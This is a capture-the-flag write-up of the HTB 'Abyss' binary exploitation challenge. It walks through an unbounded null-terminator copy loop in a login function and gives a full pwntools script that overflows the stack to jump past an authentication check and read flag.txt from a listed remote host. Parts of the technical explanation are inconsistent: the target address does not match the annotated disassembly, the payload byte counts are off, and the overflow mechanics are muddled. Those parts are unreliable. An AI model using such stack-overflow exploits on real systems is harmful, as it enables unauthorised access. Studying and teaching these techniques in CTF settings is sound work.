# HTB Abyss - Pwn Challenge Solution

**Flag:** `HTB{sH0u1D_h4v3-NU11-t3rmIn4tEd_buf!_583414af2d677036fc3ad3c419bcd882}`

**Category:** Binary Exploitation (Pwn)  
**Difficulty:** Easy  
**Points:** 1000

---

## Table of Contents
1. [Challenge Overview](#challenge-overview)
2. [Understanding the Vulnerability](#understanding-the-vulnerability)
3. [Exploit Development](#exploit-development)
4. [Step-by-Step Solution](#step-by-step-solution)
5. [Key Concepts for Beginners](#key-concepts-for-beginners)
6. [References](#references)

---

## Challenge Overview

### Challenge Description
Abyss is a secret collective of tech wizards focused on reintroducing old technology. They're working on "file transfers" - can you analyze their work and see what they're up to?

### What You Get
- `abyss` - The vulnerable binary executable
- `source.c` - The source code (helpful for analysis!)
- A remote server running the challenge at `83.136.255.106:53373`

### Goal
Read the `flag.txt` file from the server without knowing the login credentials.

---

## Understanding the Vulnerability

### The Program's Functionality

The `abyss` binary implements a simple file transfer protocol with two main commands:

1. **LOGIN (command 0)** - Authenticate with username and password
2. **READ (command 1)** - Read a file (requires authentication)

### Authentication System

```c
// Valid credentials are stored in .creds file
// Format: username:password (both randomly generated, 15 chars each)
static char VALID_USER[64];
static char VALID_PASS[64];
int logged_in = 0;  // Global flag - must be 1 to read files
```

The credentials are random, making brute force impossible!

### The Vulnerable Code

Located in `cmd_login()` function:

```c
void cmd_login()
{
    char pass[MAX_ARG_SIZE] = {0};    // MAX_ARG_SIZE = 512
    char user[MAX_ARG_SIZE] = {0};    
    char buf[MAX_ARG_SIZE];           
    int i;

    memset(buf, '\0', sizeof(buf));
    read(0, buf, sizeof(buf));        // Read up to 512 bytes

    // Check for "USER " command
    if (strncmp(buf, "USER ", 5))
        return;

    // THE VULNERABILITY IS HERE:
    i = 5;
    while (buf[i] != '\0')            // No bounds checking!
    {
        user[i - 5] = buf[i];         // Copy from buf to user
        i++;
    }
    user[i - 5] = '\0';

    // Same vulnerability exists for password handling
    // ... (similar code for PASS command)
}
```

### Why Is This Vulnerable?

**The Problem:** The `while` loop copies data until it finds a null byte (`\0`), but it never checks if we've exceeded the buffer size!

**What Happens:**
1. We send exactly 512 bytes with NO null terminator
2. The buffer `buf` is completely filled
3. The loop continues looking for `\0` beyond the buffer
4. It starts reading from adjacent memory (the `user` buffer!)
5. This allows us to overflow and overwrite the **return address**

### Stack Layout

Understanding how variables are arranged in memory (the "stack") is crucial:

```
Lower Memory Address
    ↓
[ buf[512] ]          ← Our input goes here
[ user[512] ]         ← Gets copied to here
[ pass[512] ]         ← Password buffer
[ saved i ]           ← Loop variable
[ saved RBP ]         ← Stack frame pointer
[ Return Address ]    ← Where the function returns to
    ↑
Higher Memory Address
```

**Key Insight:** If we control the return address, we can make the program jump anywhere we want!

---

## Exploit Development

### Strategy

Instead of trying to guess the credentials, we'll:
1. Overflow the buffer to overwrite the return address
2. Make the function return to the middle of `cmd_read()` 
3. Skip the authentication check
4. Read `flag.txt` directly!

### Target Address

Looking at the disassembly of `cmd_read()`:

```assembly
4014a9 <cmd_read>:
  ...
  4014e5: mov  eax,[logged_in]    ; Check if logged in
  4014eb: test eax,eax
  4014ed: jne  401500             ; Jump if logged in
  4014ef: puts "Not logged in"
  4014fb: jmp  4015b3             ; Exit
  401500: <-- WE WANT TO JUMP HERE (skips the check!)
  ...
```

**Target Address:** `0x4014eb` - This jumps right after checking `logged_in`, effectively bypassing authentication!

### The Payload Structure

From the official writeup, the magic payload is:

```python
"USER " + "AAAAAAAABBBBBBBBC\x1c" + "DDDDEEEEEEE" + p32(0x4014eb)
```

Let's break it down:
- `"USER "` - Required command prefix (5 bytes)
- `"AAAAAAAA"` - Padding (8 bytes)
- `"BBBBBBB"` - More padding (7 bytes)
- `"C"` - Another padding byte (1 byte)
- `"\x1c"` - **Magic byte!** (1 byte) - Controls loop behavior
- `"DDDDEEEEEEE"` - Final padding (11 bytes)
- `p32(0x4014eb)` - Our target address (4 bytes)

**Total:** 5 + 8 + 7 + 1 + 1 + 11 + 4 = 37 bytes

### Why Does This Work?

1. The payload is carefully crafted to reach the return address position
2. The `\x1c` byte (28 in decimal) causes the loop variable `i` to behave in a specific way
3. When combined with the PASS overflow, it overwrites the return address
4. The function returns to `0x4014eb` instead of its normal location

---

## Step-by-Step Solution

### Final Exploit Code

```python
#!/usr/bin/env python3
from pwn import *

# Connection details
host = '83.136.255.106'
port = 53373

# Connect to the server
io = remote(host, port)

# Step 1: Send LOGIN command (command ID = 0)
io.send(p32(0))
sleep(0.2)

# Step 2: Send crafted USER payload
# This sets up our buffer overflow
io.send(b"USER " + b"AAAAAAAABBBBBBBBC\x1c" + b"DDDDEEEEEEE" + p32(0x4014eb))
sleep(0.2)

# Step 3: Send PASS payload to trigger the overflow
# Fill the entire buffer (512 - 5 for "PASS " = 507 bytes)
io.send(b"PASS " + b"D" * 507)
sleep(0.2)

# Step 4: Send the filename to read
# Note: No READ command needed! We jumped directly into cmd_read()
io.send(b"flag.txt")

# Step 5: Receive and display the flag
flag = io.recvall(timeout=2)
print(flag.decode())
io.close()
```

### Running the Exploit

```bash
cd /home/kali/Downloads/HTB\ CTF/pwn/abyss
python3 solution.py
```

**Output:**
```
HTB{sH0u1D_h4v3-NU11-t3rmIn4tEd_buf!_583414af2d677036fc3ad3c419bcd882}
```

---

## Key Concepts for Beginners

### 1. Buffer Overflow
**What it is:** Writing more data into a buffer than it can hold, causing data to "overflow" into adjacent memory.

**Analogy:** Imagine a cup that can hold 500ml. If you pour 600ml, the extra 100ml spills over onto the table. In memory, this "spilling" can overwrite important data!

### 2. The Stack
**What it is:** A region of memory used for:
- Local variables (like `buf`, `user`, `pass`)
- Function return addresses (where to go when function ends)
- Saved registers

**How it works:** Like a stack of plates - Last In, First Out (LIFO)

### 3. Return Address
**What it is:** A memory address stored on the stack that tells the CPU where to continue execution after a function finishes.

**Why it matters:** If we can overwrite this, we control where the program goes next!

### 4. Bypassing Authentication
Instead of finding the password, we:
1. Overflow the buffer
2. Overwrite the return address
3. Jump directly to the "already authenticated" code path

### 5. Important Tools

**pwntools** - Python library for exploit development
```python
from pwn import *
p32(0x4014eb)  # Converts number to 4-byte little-endian format
remote(host, port)  # Connect to remote server
```

**objdump** - Disassemble binaries to see assembly code
```bash
objdump -d abyss | grep cmd_read
```

**file** - Check binary properties
```bash
file abyss  # Shows: 64-bit ELF, not stripped
```

---

## Key Lessons Learned

### 1. Always Null-Terminate Strings!
The vulnerability exists because the program doesn't ensure null termination. The fix would be:
```c
// BEFORE (vulnerable):
read(0, buf, sizeof(buf));

// AFTER (safe):
read(0, buf, sizeof(buf) - 1);
buf[sizeof(buf) - 1] = '\0';  // Ensure null termination
```

### 2. Use Safe String Functions
Instead of manual copying with `while` loops:
```c
// UNSAFE:
while (buf[i] != '\0') {
    user[i-5] = buf[i];
    i++;
}

// SAFE:
strncpy(user, buf + 5, sizeof(user) - 1);
user[sizeof(user) - 1] = '\0';
```

### 3. Enable Security Features
Modern compilers have protections:
- **Stack Canaries** - Detect stack corruption
- **ASLR** (Address Space Layout Randomization) - Randomize memory addresses
- **NX/DEP** - Prevent code execution from stack
- **PIE** (Position Independent Executable) - Randomize code location

This binary had minimal protections, making it easier to exploit.

---

## References

### Official Resources
- [HTB Business CTF 2024 - Abyss Official Writeup](https://github.com/hackthebox/business-ctf-2024/tree/main/pwn/%5BEasy%5D%20Abyss)
- [pwntools Documentation](https://docs.pwntools.com/)

### Learning Resources
- **Buffer Overflows:** LiveOverflow YouTube channel
- **Binary Exploitation:** pwn.college
- **Assembly Language:** [x86-64 Assembly Guide](https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf)

### Community Writeups
- [UKatemi Blog - Abyss Writeup](https://blog.ukatemi.com/blog/2024-05-17-hackthebox-business-pwn-abyss/)
- [Motasem Notes - Abyss Writeup](https://motasem-notes.net/hackthebox-abyss-writeup-binary-exploitation-ctf/)

---

## Conclusion

This challenge demonstrates a classic buffer overflow vulnerability caused by:
1. Lack of bounds checking
2. Missing null termination validation
3. Unsafe string copying operations

The exploit bypasses authentication by controlling program flow through return address overwriting - a fundamental technique in binary exploitation.

**Remember:** The best way to learn is by practicing! Try modifying the exploit, test it locally, and understand each step.

---

**Challenge Solved:** ✅  
**Flag Captured:** ✅  
**Knowledge Gained:** ✅

